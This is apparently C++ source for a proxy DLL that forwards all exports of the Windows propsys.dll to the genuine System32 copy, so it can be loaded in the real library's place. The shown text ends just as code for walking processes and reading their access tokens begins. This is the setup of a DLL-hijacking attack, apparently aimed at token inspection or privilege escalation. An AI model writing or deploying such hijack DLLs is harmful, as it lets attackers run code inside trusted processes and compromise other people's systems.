#pragma comment(linker,"/export:ClearPropVariantArray=C:\\WINDOWS\\system32\\propsys.ClearPropVariantArray,@4")
#pragma comment(linker,"/export:ClearVariantArray=C:\\WINDOWS\\system32\\propsys.ClearVariantArray,@5")
#pragma comment(linker,"/export:DllCanUnloadNow=C:\\WINDOWS\\system32\\propsys.DllCanUnloadNow,@6")
#pragma comment(linker,"/export:DllGetClassObject=C:\\WINDOWS\\system32\\propsys.DllGetClassObject,@7")
#pragma comment(linker,"/export:DllRegisterServer=C:\\WINDOWS\\system32\\propsys.DllRegisterServer,@8")
#pragma comment(linker,"/export:DllUnregisterServer=C:\\WINDOWS\\system32\\propsys.DllUnregisterServer,@9")
#pragma comment(linker,"/export:GetProxyDllInfo=C:\\WINDOWS\\system32\\propsys.GetProxyDllInfo,@3")
#pragma comment(linker,"/export:InitPropVariantFromBooleanVector=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromBooleanVector,@10")
#pragma comment(linker,"/export:InitPropVariantFromBuffer=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromBuffer,@11")
#pragma comment(linker,"/export:InitPropVariantFromCLSID=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromCLSID,@12")
#pragma comment(linker,"/export:InitPropVariantFromDoubleVector=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromDoubleVector,@13")
#pragma comment(linker,"/export:InitPropVariantFromFileTime=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromFileTime,@14")
#pragma comment(linker,"/export:InitPropVariantFromFileTimeVector=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromFileTimeVector,@15")
#pragma comment(linker,"/export:InitPropVariantFromGUIDAsString=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromGUIDAsString,@16")
#pragma comment(linker,"/export:InitPropVariantFromInt16Vector=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromInt16Vector,@17")
#pragma comment(linker,"/export:InitPropVariantFromInt32Vector=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromInt32Vector,@18")
#pragma comment(linker,"/export:InitPropVariantFromInt64Vector=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromInt64Vector,@19")
#pragma comment(linker,"/export:InitPropVariantFromPropVariantVectorElem=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromPropVariantVectorElem,@20")
#pragma comment(linker,"/export:InitPropVariantFromResource=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromResource,@21")
#pragma comment(linker,"/export:InitPropVariantFromStrRet=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromStrRet,@22")
#pragma comment(linker,"/export:InitPropVariantFromStringAsVector=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromStringAsVector,@23")
#pragma comment(linker,"/export:InitPropVariantFromStringVector=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromStringVector,@24")
#pragma comment(linker,"/export:InitPropVariantFromUInt16Vector=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromUInt16Vector,@25")
#pragma comment(linker,"/export:InitPropVariantFromUInt32Vector=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromUInt32Vector,@26")
#pragma comment(linker,"/export:InitPropVariantFromUInt64Vector=C:\\WINDOWS\\system32\\propsys.InitPropVariantFromUInt64Vector,@27")
#pragma comment(linker,"/export:InitPropVariantVectorFromPropVariant=C:\\WINDOWS\\system32\\propsys.InitPropVariantVectorFromPropVariant,@28")
#pragma comment(linker,"/export:InitVariantFromBooleanArray=C:\\WINDOWS\\system32\\propsys.InitVariantFromBooleanArray,@29")
#pragma comment(linker,"/export:InitVariantFromBuffer=C:\\WINDOWS\\system32\\propsys.InitVariantFromBuffer,@30")
#pragma comment(linker,"/export:InitVariantFromDoubleArray=C:\\WINDOWS\\system32\\propsys.InitVariantFromDoubleArray,@31")
#pragma comment(linker,"/export:InitVariantFromFileTime=C:\\WINDOWS\\system32\\propsys.InitVariantFromFileTime,@32")
#pragma comment(linker,"/export:InitVariantFromFileTimeArray=C:\\WINDOWS\\system32\\propsys.InitVariantFromFileTimeArray,@33")
#pragma comment(linker,"/export:InitVariantFromGUIDAsString=C:\\WINDOWS\\system32\\propsys.InitVariantFromGUIDAsString,@34")
#pragma comment(linker,"/export:InitVariantFromInt16Array=C:\\WINDOWS\\system32\\propsys.InitVariantFromInt16Array,@35")
#pragma comment(linker,"/export:InitVariantFromInt32Array=C:\\WINDOWS\\system32\\propsys.InitVariantFromInt32Array,@36")
#pragma comment(linker,"/export:InitVariantFromInt64Array=C:\\WINDOWS\\system32\\propsys.InitVariantFromInt64Array,@37")
#pragma comment(linker,"/export:InitVariantFromResource=C:\\WINDOWS\\system32\\propsys.InitVariantFromResource,@38")
#pragma comment(linker,"/export:InitVariantFromStrRet=C:\\WINDOWS\\system32\\propsys.InitVariantFromStrRet,@39")
#pragma comment(linker,"/export:InitVariantFromStringArray=C:\\WINDOWS\\system32\\propsys.InitVariantFromStringArray,@40")
#pragma comment(linker,"/export:InitVariantFromUInt16Array=C:\\WINDOWS\\system32\\propsys.InitVariantFromUInt16Array,@41")
#pragma comment(linker,"/export:InitVariantFromUInt32Array=C:\\WINDOWS\\system32\\propsys.InitVariantFromUInt32Array,@42")
#pragma comment(linker,"/export:InitVariantFromUInt64Array=C:\\WINDOWS\\system32\\propsys.InitVariantFromUInt64Array,@43")
#pragma comment(linker,"/export:InitVariantFromVariantArrayElem=C:\\WINDOWS\\system32\\propsys.InitVariantFromVariantArrayElem,@44")
#pragma comment(linker,"/export:PSCoerceToCanonicalValue=C:\\WINDOWS\\system32\\propsys.PSCoerceToCanonicalValue,@45")
#pragma comment(linker,"/export:PSCreateAdapterFromPropertyStore=C:\\WINDOWS\\system32\\propsys.PSCreateAdapterFromPropertyStore,@46")
#pragma comment(linker,"/export:PSCreateDelayedMultiplexPropertyStore=C:\\WINDOWS\\system32\\propsys.PSCreateDelayedMultiplexPropertyStore,@47")
#pragma comment(linker,"/export:PSCreateMemoryPropertyStore=C:\\WINDOWS\\system32\\propsys.PSCreateMemoryPropertyStore,@48")
#pragma comment(linker,"/export:PSCreateMultiplexPropertyStore=C:\\WINDOWS\\system32\\propsys.PSCreateMultiplexPropertyStore,@49")
#pragma comment(linker,"/export:PSCreatePropertyChangeArray=C:\\WINDOWS\\system32\\propsys.PSCreatePropertyChangeArray,@50")
#pragma comment(linker,"/export:PSCreatePropertyStoreFromObject=C:\\WINDOWS\\system32\\propsys.PSCreatePropertyStoreFromObject,@51")
#pragma comment(linker,"/export:PSCreatePropertyStoreFromPropertySetStorage=C:\\WINDOWS\\system32\\propsys.PSCreatePropertyStoreFromPropertySetStorage,@52")
#pragma comment(linker,"/export:PSCreateSimplePropertyChange=C:\\WINDOWS\\system32\\propsys.PSCreateSimplePropertyChange,@53")
#pragma comment(linker,"/export:PSEnumeratePropertyDescriptions=C:\\WINDOWS\\system32\\propsys.PSEnumeratePropertyDescriptions,@54")
#pragma comment(linker,"/export:PSFormatForDisplay=C:\\WINDOWS\\system32\\propsys.PSFormatForDisplay,@55")
#pragma comment(linker,"/export:PSFormatForDisplayAlloc=C:\\WINDOWS\\system32\\propsys.PSFormatForDisplayAlloc,@56")
#pragma comment(linker,"/export:PSFormatPropertyValue=C:\\WINDOWS\\system32\\propsys.PSFormatPropertyValue,@57")
#pragma comment(linker,"/export:PSGetImageReferenceForValue=C:\\WINDOWS\\system32\\propsys.PSGetImageReferenceForValue,@58")
#pragma comment(linker,"/export:PSGetItemPropertyHandler=C:\\WINDOWS\\system32\\propsys.PSGetItemPropertyHandler,@59")
#pragma comment(linker,"/export:PSGetItemPropertyHandlerWithCreateObject=C:\\WINDOWS\\system32\\propsys.PSGetItemPropertyHandlerWithCreateObject,@60")
#pragma comment(linker,"/export:PSGetNameFromPropertyKey=C:\\WINDOWS\\system32\\propsys.PSGetNameFromPropertyKey,@61")
#pragma comment(linker,"/export:PSGetNamedPropertyFromPropertyStorage=C:\\WINDOWS\\system32\\propsys.PSGetNamedPropertyFromPropertyStorage,@62")
#pragma comment(linker,"/export:PSGetPropertyDescriptionByName=C:\\WINDOWS\\system32\\propsys.PSGetPropertyDescriptionByName,@64")
#pragma comment(linker,"/export:PSGetPropertyDescriptionListFromString=C:\\WINDOWS\\system32\\propsys.PSGetPropertyDescriptionListFromString,@65")
#pragma comment(linker,"/export:PSGetPropertyFromPropertyStorage=C:\\WINDOWS\\system32\\propsys.PSGetPropertyFromPropertyStorage,@66")
#pragma comment(linker,"/export:PSGetPropertyKeyFromName=C:\\WINDOWS\\system32\\propsys.PSGetPropertyKeyFromName,@67")
#pragma comment(linker,"/export:PSGetPropertySystem=C:\\WINDOWS\\system32\\propsys.PSGetPropertySystem,@68")
#pragma comment(linker,"/export:PSGetPropertyValue=C:\\WINDOWS\\system32\\propsys.PSGetPropertyValue,@69")
#pragma comment(linker,"/export:PSLookupPropertyHandlerCLSID=C:\\WINDOWS\\system32\\propsys.PSLookupPropertyHandlerCLSID,@70")
#pragma comment(linker,"/export:PSPropertyBag_Delete=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_Delete,@71")
#pragma comment(linker,"/export:PSPropertyBag_ReadBOOL=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadBOOL,@72")
#pragma comment(linker,"/export:PSPropertyBag_ReadBSTR=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadBSTR,@73")
#pragma comment(linker,"/export:PSPropertyBag_ReadDWORD=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadDWORD,@74")
#pragma comment(linker,"/export:PSPropertyBag_ReadGUID=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadGUID,@75")
#pragma comment(linker,"/export:PSPropertyBag_ReadInt=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadInt,@76")
#pragma comment(linker,"/export:PSPropertyBag_ReadLONG=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadLONG,@77")
#pragma comment(linker,"/export:PSPropertyBag_ReadPOINTL=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadPOINTL,@78")
#pragma comment(linker,"/export:PSPropertyBag_ReadPOINTS=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadPOINTS,@79")
#pragma comment(linker,"/export:PSPropertyBag_ReadPropertyKey=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadPropertyKey,@80")
#pragma comment(linker,"/export:PSPropertyBag_ReadRECTL=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadRECTL,@81")
#pragma comment(linker,"/export:PSPropertyBag_ReadSHORT=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadSHORT,@82")
#pragma comment(linker,"/export:PSPropertyBag_ReadStr=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadStr,@83")
#pragma comment(linker,"/export:PSPropertyBag_ReadStrAlloc=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadStrAlloc,@84")
#pragma comment(linker,"/export:PSPropertyBag_ReadStream=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadStream,@85")
#pragma comment(linker,"/export:PSPropertyBag_ReadType=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadType,@86")
#pragma comment(linker,"/export:PSPropertyBag_ReadULONGLONG=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadULONGLONG,@87")
#pragma comment(linker,"/export:PSPropertyBag_ReadUnknown=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_ReadUnknown,@88")
#pragma comment(linker,"/export:PSPropertyBag_WriteBOOL=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_WriteBOOL,@89")
#pragma comment(linker,"/export:PSPropertyBag_WriteBSTR=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_WriteBSTR,@90")
#pragma comment(linker,"/export:PSPropertyBag_WriteDWORD=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_WriteDWORD,@91")
#pragma comment(linker,"/export:PSPropertyBag_WriteGUID=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_WriteGUID,@92")
#pragma comment(linker,"/export:PSPropertyBag_WriteInt=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_WriteInt,@93")
#pragma comment(linker,"/export:PSPropertyBag_WriteLONG=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_WriteLONG,@94")
#pragma comment(linker,"/export:PSPropertyBag_WritePOINTL=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_WritePOINTL,@95")
#pragma comment(linker,"/export:PSPropertyBag_WritePOINTS=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_WritePOINTS,@96")
#pragma comment(linker,"/export:PSPropertyBag_WritePropertyKey=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_WritePropertyKey,@97")
#pragma comment(linker,"/export:PSPropertyBag_WriteRECTL=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_WriteRECTL,@98")
#pragma comment(linker,"/export:PSPropertyBag_WriteSHORT=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_WriteSHORT,@99")
#pragma comment(linker,"/export:PSPropertyBag_WriteStr=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_WriteStr,@100")
#pragma comment(linker,"/export:PSPropertyBag_WriteStream=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_WriteStream,@101")
#pragma comment(linker,"/export:PSPropertyBag_WriteULONGLONG=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_WriteULONGLONG,@102")
#pragma comment(linker,"/export:PSPropertyBag_WriteUnknown=C:\\WINDOWS\\system32\\propsys.PSPropertyBag_WriteUnknown,@103")
#pragma comment(linker,"/export:PSPropertyKeyFromString=C:\\WINDOWS\\system32\\propsys.PSPropertyKeyFromString,@104")
#pragma comment(linker,"/export:PSRefreshPropertySchema=C:\\WINDOWS\\system32\\propsys.PSRefreshPropertySchema,@105")
#pragma comment(linker,"/export:PSRegisterPropertySchema=C:\\WINDOWS\\system32\\propsys.PSRegisterPropertySchema,@106")
#pragma comment(linker,"/export:PSSetPropertyValue=C:\\WINDOWS\\system32\\propsys.PSSetPropertyValue,@107")
#pragma comment(linker,"/export:PSStringFromPropertyKey=C:\\WINDOWS\\system32\\propsys.PSStringFromPropertyKey,@108")
#pragma comment(linker,"/export:PSUnregisterPropertySchema=C:\\WINDOWS\\system32\\propsys.PSUnregisterPropertySchema,@109")
#pragma comment(linker,"/export:PropVariantChangeType=C:\\WINDOWS\\system32\\propsys.PropVariantChangeType,@110")
#pragma comment(linker,"/export:PropVariantCompareEx=C:\\WINDOWS\\system32\\propsys.PropVariantCompareEx,@111")
#pragma comment(linker,"/export:PropVariantGetBooleanElem=C:\\WINDOWS\\system32\\propsys.PropVariantGetBooleanElem,@112")
#pragma comment(linker,"/export:PropVariantGetDoubleElem=C:\\WINDOWS\\system32\\propsys.PropVariantGetDoubleElem,@113")
#pragma comment(linker,"/export:PropVariantGetElementCount=C:\\WINDOWS\\system32\\propsys.PropVariantGetElementCount,@114")
#pragma comment(linker,"/export:PropVariantGetFileTimeElem=C:\\WINDOWS\\system32\\propsys.PropVariantGetFileTimeElem,@115")
#pragma comment(linker,"/export:PropVariantGetInt16Elem=C:\\WINDOWS\\system32\\propsys.PropVariantGetInt16Elem,@116")
#pragma comment(linker,"/export:PropVariantGetInt32Elem=C:\\WINDOWS\\system32\\propsys.PropVariantGetInt32Elem,@117")
#pragma comment(linker,"/export:PropVariantGetInt64Elem=C:\\WINDOWS\\system32\\propsys.PropVariantGetInt64Elem,@118")
#pragma comment(linker,"/export:PropVariantGetStringElem=C:\\WINDOWS\\system32\\propsys.PropVariantGetStringElem,@119")
#pragma comment(linker,"/export:PropVariantGetUInt16Elem=C:\\WINDOWS\\system32\\propsys.PropVariantGetUInt16Elem,@120")
#pragma comment(linker,"/export:PropVariantGetUInt32Elem=C:\\WINDOWS\\system32\\propsys.PropVariantGetUInt32Elem,@121")
#pragma comment(linker,"/export:PropVariantGetUInt64Elem=C:\\WINDOWS\\system32\\propsys.PropVariantGetUInt64Elem,@122")
#pragma comment(linker,"/export:PropVariantToBSTR=C:\\WINDOWS\\system32\\propsys.PropVariantToBSTR,@123")
#pragma comment(linker,"/export:PropVariantToBoolean=C:\\WINDOWS\\system32\\propsys.PropVariantToBoolean,@124")
#pragma comment(linker,"/export:PropVariantToBooleanVector=C:\\WINDOWS\\system32\\propsys.PropVariantToBooleanVector,@125")
#pragma comment(linker,"/export:PropVariantToBooleanVectorAlloc=C:\\WINDOWS\\system32\\propsys.PropVariantToBooleanVectorAlloc,@126")
#pragma comment(linker,"/export:PropVariantToBooleanWithDefault=C:\\WINDOWS\\system32\\propsys.PropVariantToBooleanWithDefault,@127")
#pragma comment(linker,"/export:PropVariantToBuffer=C:\\WINDOWS\\system32\\propsys.PropVariantToBuffer,@128")
#pragma comment(linker,"/export:PropVariantToDouble=C:\\WINDOWS\\system32\\propsys.PropVariantToDouble,@129")
#pragma comment(linker,"/export:PropVariantToDoubleVector=C:\\WINDOWS\\system32\\propsys.PropVariantToDoubleVector,@130")
#pragma comment(linker,"/export:PropVariantToDoubleVectorAlloc=C:\\WINDOWS\\system32\\propsys.PropVariantToDoubleVectorAlloc,@131")
#pragma comment(linker,"/export:PropVariantToDoubleWithDefault=C:\\WINDOWS\\system32\\propsys.PropVariantToDoubleWithDefault,@132")
#pragma comment(linker,"/export:PropVariantToFileTime=C:\\WINDOWS\\system32\\propsys.PropVariantToFileTime,@133")
#pragma comment(linker,"/export:PropVariantToFileTimeVector=C:\\WINDOWS\\system32\\propsys.PropVariantToFileTimeVector,@134")
#pragma comment(linker,"/export:PropVariantToFileTimeVectorAlloc=C:\\WINDOWS\\system32\\propsys.PropVariantToFileTimeVectorAlloc,@135")
#pragma comment(linker,"/export:PropVariantToGUID=C:\\WINDOWS\\system32\\propsys.PropVariantToGUID,@136")
#pragma comment(linker,"/export:PropVariantToInt16=C:\\WINDOWS\\system32\\propsys.PropVariantToInt16,@137")
#pragma comment(linker,"/export:PropVariantToInt16Vector=C:\\WINDOWS\\system32\\propsys.PropVariantToInt16Vector,@138")
#pragma comment(linker,"/export:PropVariantToInt16VectorAlloc=C:\\WINDOWS\\system32\\propsys.PropVariantToInt16VectorAlloc,@139")
#pragma comment(linker,"/export:PropVariantToInt16WithDefault=C:\\WINDOWS\\system32\\propsys.PropVariantToInt16WithDefault,@140")
#pragma comment(linker,"/export:PropVariantToInt32=C:\\WINDOWS\\system32\\propsys.PropVariantToInt32,@141")
#pragma comment(linker,"/export:PropVariantToInt32Vector=C:\\WINDOWS\\system32\\propsys.PropVariantToInt32Vector,@142")
#pragma comment(linker,"/export:PropVariantToInt32VectorAlloc=C:\\WINDOWS\\system32\\propsys.PropVariantToInt32VectorAlloc,@143")
#pragma comment(linker,"/export:PropVariantToInt32WithDefault=C:\\WINDOWS\\system32\\propsys.PropVariantToInt32WithDefault,@144")
#pragma comment(linker,"/export:PropVariantToInt64=C:\\WINDOWS\\system32\\propsys.PropVariantToInt64,@145")
#pragma comment(linker,"/export:PropVariantToInt64Vector=C:\\WINDOWS\\system32\\propsys.PropVariantToInt64Vector,@146")
#pragma comment(linker,"/export:PropVariantToInt64VectorAlloc=C:\\WINDOWS\\system32\\propsys.PropVariantToInt64VectorAlloc,@147")
#pragma comment(linker,"/export:PropVariantToInt64WithDefault=C:\\WINDOWS\\system32\\propsys.PropVariantToInt64WithDefault,@148")
#pragma comment(linker,"/export:PropVariantToStrRet=C:\\WINDOWS\\system32\\propsys.PropVariantToStrRet,@149")
#pragma comment(linker,"/export:PropVariantToString=C:\\WINDOWS\\system32\\propsys.PropVariantToString,@150")
#pragma comment(linker,"/export:PropVariantToStringAlloc=C:\\WINDOWS\\system32\\propsys.PropVariantToStringAlloc,@151")
#pragma comment(linker,"/export:PropVariantToStringVector=C:\\WINDOWS\\system32\\propsys.PropVariantToStringVector,@152")
#pragma comment(linker,"/export:PropVariantToStringVectorAlloc=C:\\WINDOWS\\system32\\propsys.PropVariantToStringVectorAlloc,@153")
#pragma comment(linker,"/export:PropVariantToStringWithDefault=C:\\WINDOWS\\system32\\propsys.PropVariantToStringWithDefault,@154")
#pragma comment(linker,"/export:PropVariantToUInt16=C:\\WINDOWS\\system32\\propsys.PropVariantToUInt16,@155")
#pragma comment(linker,"/export:PropVariantToUInt16Vector=C:\\WINDOWS\\system32\\propsys.PropVariantToUInt16Vector,@156")
#pragma comment(linker,"/export:PropVariantToUInt16VectorAlloc=C:\\WINDOWS\\system32\\propsys.PropVariantToUInt16VectorAlloc,@157")
#pragma comment(linker,"/export:PropVariantToUInt16WithDefault=C:\\WINDOWS\\system32\\propsys.PropVariantToUInt16WithDefault,@158")
#pragma comment(linker,"/export:PropVariantToUInt32=C:\\WINDOWS\\system32\\propsys.PropVariantToUInt32,@159")
#pragma comment(linker,"/export:PropVariantToUInt32Vector=C:\\WINDOWS\\system32\\propsys.PropVariantToUInt32Vector,@160")
#pragma comment(linker,"/export:PropVariantToUInt32VectorAlloc=C:\\WINDOWS\\system32\\propsys.PropVariantToUInt32VectorAlloc,@161")
#pragma comment(linker,"/export:PropVariantToUInt32WithDefault=C:\\WINDOWS\\system32\\propsys.PropVariantToUInt32WithDefault,@162")
#pragma comment(linker,"/export:PropVariantToUInt64=C:\\WINDOWS\\system32\\propsys.PropVariantToUInt64,@163")
#pragma comment(linker,"/export:PropVariantToUInt64Vector=C:\\WINDOWS\\system32\\propsys.PropVariantToUInt64Vector,@164")
#pragma comment(linker,"/export:PropVariantToUInt64VectorAlloc=C:\\WINDOWS\\system32\\propsys.PropVariantToUInt64VectorAlloc,@165")
#pragma comment(linker,"/export:PropVariantToUInt64WithDefault=C:\\WINDOWS\\system32\\propsys.PropVariantToUInt64WithDefault,@166")
#pragma comment(linker,"/export:PropVariantToVariant=C:\\WINDOWS\\system32\\propsys.PropVariantToVariant,@167")
#pragma comment(linker,"/export:PropVariantToWinRTPropertyValue=C:\\WINDOWS\\system32\\propsys.PropVariantToWinRTPropertyValue,@435")
#pragma comment(linker,"/export:StgDeserializePropVariant=C:\\WINDOWS\\system32\\propsys.StgDeserializePropVariant,@168")
#pragma comment(linker,"/export:StgSerializePropVariant=C:\\WINDOWS\\system32\\propsys.StgSerializePropVariant,@169")
#pragma comment(linker,"/export:VariantCompare=C:\\WINDOWS\\system32\\propsys.VariantCompare,@170")
#pragma comment(linker,"/export:VariantGetBooleanElem=C:\\WINDOWS\\system32\\propsys.VariantGetBooleanElem,@171")
#pragma comment(linker,"/export:VariantGetDoubleElem=C:\\WINDOWS\\system32\\propsys.VariantGetDoubleElem,@172")
#pragma comment(linker,"/export:VariantGetElementCount=C:\\WINDOWS\\system32\\propsys.VariantGetElementCount,@173")
#pragma comment(linker,"/export:VariantGetInt16Elem=C:\\WINDOWS\\system32\\propsys.VariantGetInt16Elem,@174")
#pragma comment(linker,"/export:VariantGetInt32Elem=C:\\WINDOWS\\system32\\propsys.VariantGetInt32Elem,@175")
#pragma comment(linker,"/export:VariantGetInt64Elem=C:\\WINDOWS\\system32\\propsys.VariantGetInt64Elem,@176")
#pragma comment(linker,"/export:VariantGetStringElem=C:\\WINDOWS\\system32\\propsys.VariantGetStringElem,@177")
#pragma comment(linker,"/export:VariantGetUInt16Elem=C:\\WINDOWS\\system32\\propsys.VariantGetUInt16Elem,@178")
#pragma comment(linker,"/export:VariantGetUInt32Elem=C:\\WINDOWS\\system32\\propsys.VariantGetUInt32Elem,@179")
#pragma comment(linker,"/export:VariantGetUInt64Elem=C:\\WINDOWS\\system32\\propsys.VariantGetUInt64Elem,@180")
#pragma comment(linker,"/export:VariantToBoolean=C:\\WINDOWS\\system32\\propsys.VariantToBoolean,@181")
#pragma comment(linker,"/export:VariantToBooleanArray=C:\\WINDOWS\\system32\\propsys.VariantToBooleanArray,@182")
#pragma comment(linker,"/export:VariantToBooleanArrayAlloc=C:\\WINDOWS\\system32\\propsys.VariantToBooleanArrayAlloc,@183")
#pragma comment(linker,"/export:VariantToBooleanWithDefault=C:\\WINDOWS\\system32\\propsys.VariantToBooleanWithDefault,@184")
#pragma comment(linker,"/export:VariantToBuffer=C:\\WINDOWS\\system32\\propsys.VariantToBuffer,@185")
#pragma comment(linker,"/export:VariantToDosDateTime=C:\\WINDOWS\\system32\\propsys.VariantToDosDateTime,@186")
#pragma comment(linker,"/export:VariantToDouble=C:\\WINDOWS\\system32\\propsys.VariantToDouble,@187")
#pragma comment(linker,"/export:VariantToDoubleArray=C:\\WINDOWS\\system32\\propsys.VariantToDoubleArray,@188")
#pragma comment(linker,"/export:VariantToDoubleArrayAlloc=C:\\WINDOWS\\system32\\propsys.VariantToDoubleArrayAlloc,@189")
#pragma comment(linker,"/export:VariantToDoubleWithDefault=C:\\WINDOWS\\system32\\propsys.VariantToDoubleWithDefault,@190")
#pragma comment(linker,"/export:VariantToFileTime=C:\\WINDOWS\\system32\\propsys.VariantToFileTime,@191")
#pragma comment(linker,"/export:VariantToGUID=C:\\WINDOWS\\system32\\propsys.VariantToGUID,@192")
#pragma comment(linker,"/export:VariantToInt16=C:\\WINDOWS\\system32\\propsys.VariantToInt16,@193")
#pragma comment(linker,"/export:VariantToInt16Array=C:\\WINDOWS\\system32\\propsys.VariantToInt16Array,@194")
#pragma comment(linker,"/export:VariantToInt16ArrayAlloc=C:\\WINDOWS\\system32\\propsys.VariantToInt16ArrayAlloc,@195")
#pragma comment(linker,"/export:VariantToInt16WithDefault=C:\\WINDOWS\\system32\\propsys.VariantToInt16WithDefault,@196")
#pragma comment(linker,"/export:VariantToInt32=C:\\WINDOWS\\system32\\propsys.VariantToInt32,@197")
#pragma comment(linker,"/export:VariantToInt32Array=C:\\WINDOWS\\system32\\propsys.VariantToInt32Array,@198")
#pragma comment(linker,"/export:VariantToInt32ArrayAlloc=C:\\WINDOWS\\system32\\propsys.VariantToInt32ArrayAlloc,@199")
#pragma comment(linker,"/export:VariantToInt32WithDefault=C:\\WINDOWS\\system32\\propsys.VariantToInt32WithDefault,@200")
#pragma comment(linker,"/export:VariantToInt64=C:\\WINDOWS\\system32\\propsys.VariantToInt64,@201")
#pragma comment(linker,"/export:VariantToInt64Array=C:\\WINDOWS\\system32\\propsys.VariantToInt64Array,@202")
#pragma comment(linker,"/export:VariantToInt64ArrayAlloc=C:\\WINDOWS\\system32\\propsys.VariantToInt64ArrayAlloc,@203")
#pragma comment(linker,"/export:VariantToInt64WithDefault=C:\\WINDOWS\\system32\\propsys.VariantToInt64WithDefault,@204")
#pragma comment(linker,"/export:VariantToPropVariant=C:\\WINDOWS\\system32\\propsys.VariantToPropVariant,@205")
#pragma comment(linker,"/export:VariantToStrRet=C:\\WINDOWS\\system32\\propsys.VariantToStrRet,@206")
#pragma comment(linker,"/export:VariantToString=C:\\WINDOWS\\system32\\propsys.VariantToString,@207")
#pragma comment(linker,"/export:VariantToStringAlloc=C:\\WINDOWS\\system32\\propsys.VariantToStringAlloc,@208")
#pragma comment(linker,"/export:VariantToStringArray=C:\\WINDOWS\\system32\\propsys.VariantToStringArray,@209")
#pragma comment(linker,"/export:VariantToStringArrayAlloc=C:\\WINDOWS\\system32\\propsys.VariantToStringArrayAlloc,@210")
#pragma comment(linker,"/export:VariantToStringWithDefault=C:\\WINDOWS\\system32\\propsys.VariantToStringWithDefault,@211")
#pragma comment(linker,"/export:VariantToUInt16=C:\\WINDOWS\\system32\\propsys.VariantToUInt16,@212")
#pragma comment(linker,"/export:VariantToUInt16Array=C:\\WINDOWS\\system32\\propsys.VariantToUInt16Array,@213")
#pragma comment(linker,"/export:VariantToUInt16ArrayAlloc=C:\\WINDOWS\\system32\\propsys.VariantToUInt16ArrayAlloc,@214")
#pragma comment(linker,"/export:VariantToUInt16WithDefault=C:\\WINDOWS\\system32\\propsys.VariantToUInt16WithDefault,@215")
#pragma comment(linker,"/export:VariantToUInt32=C:\\WINDOWS\\system32\\propsys.VariantToUInt32,@216")
#pragma comment(linker,"/export:VariantToUInt32Array=C:\\WINDOWS\\system32\\propsys.VariantToUInt32Array,@217")
#pragma comment(linker,"/export:VariantToUInt32ArrayAlloc=C:\\WINDOWS\\system32\\propsys.VariantToUInt32ArrayAlloc,@218")
#pragma comment(linker,"/export:VariantToUInt32WithDefault=C:\\WINDOWS\\system32\\propsys.VariantToUInt32WithDefault,@219")
#pragma comment(linker,"/export:VariantToUInt64=C:\\WINDOWS\\system32\\propsys.VariantToUInt64,@220")
#pragma comment(linker,"/export:VariantToUInt64Array=C:\\WINDOWS\\system32\\propsys.VariantToUInt64Array,@221")
#pragma comment(linker,"/export:VariantToUInt64ArrayAlloc=C:\\WINDOWS\\system32\\propsys.VariantToUInt64ArrayAlloc,@222")
#pragma comment(linker,"/export:VariantToUInt64WithDefault=C:\\WINDOWS\\system32\\propsys.VariantToUInt64WithDefault,@223")
#pragma comment(linker,"/export:WinRTPropertyValueToPropVariant=C:\\WINDOWS\\system32\\propsys.WinRTPropertyValueToPropVariant,@436")
#include <windows.h>
#include <Winuser.h> 
#include <iostream>
#include <Psapi.h>
#include <Tlhelp32.h>
#include <sddl.h>
#include <shlobj.h>

#pragma comment (lib,"advapi32.lib")

#define PROCESS_ARRAY 2048


std::string wcharToString(wchar_t input[1024])
{
	std::wstring wstringValue(input);
	std::string convertedString(wstringValue.begin(), wstringValue.end());

	return convertedString;
}

void GetTokenInfo(HANDLE TokenHandle)
{
	LPVOID TokenInformation = NULL;
	DWORD TokenInformationLength = 0;
	DWORD ReturnLength;
	SID_NAME_USE SidType;

	GetTokenInformation(TokenHandle, TokenUser, NULL, 0, &ReturnLength);

	PTOKEN_USER pTokenUser = (PTOKEN_USER)GlobalAlloc(GPTR, ReturnLength);

